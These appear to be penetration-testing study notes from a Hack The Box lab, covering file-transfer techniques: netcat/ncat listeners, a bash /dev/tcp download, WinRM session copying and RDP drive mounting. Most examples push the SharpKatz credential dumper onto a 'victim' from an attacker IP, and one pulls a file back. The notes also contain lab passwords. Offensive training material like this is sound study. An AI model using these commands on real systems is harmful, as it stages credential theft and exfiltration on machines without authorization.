#### NetCat File Download

RHOST:
```shell-session
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

LHOST:
```shell-session
Tachipy@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
Tachipy@htb[/htb]$ # Example using Original Netcat
Tachipy@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

#### NetCat File  Send 

LHOST:
```shell-session
Tachipy@htb[/htb]$ # Example using Ncat
Tachipy@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
RHOST:
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

#### Dev TCP Receive
LHOST:
```shell-session
Tachipy@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
RHOST:
```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

#### WinRM File Transfer
Check if port is open:
```powershell-session
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
create session:
```powershell-session
$Session = New-PSSession -ComputerName DATABASE01
```
Copy to victim:
```powershell-session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
Copy From victim:
```powershell-session
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
#### Mounting a Linux Folder Using xfreerdp

  Mounting a Linux Folder Using xfreerdp

```shell-session
Tachipy@htb[/htb]$ xfreerdp /v:10.129.205.118 /d:rdp /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/htb-ac-711424/http
```
#### Mounting a Linux Folder Using (RDP)rdesktop

  Mounting a Linux Folder Using rdesktop

```shell-session
Tachipy@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
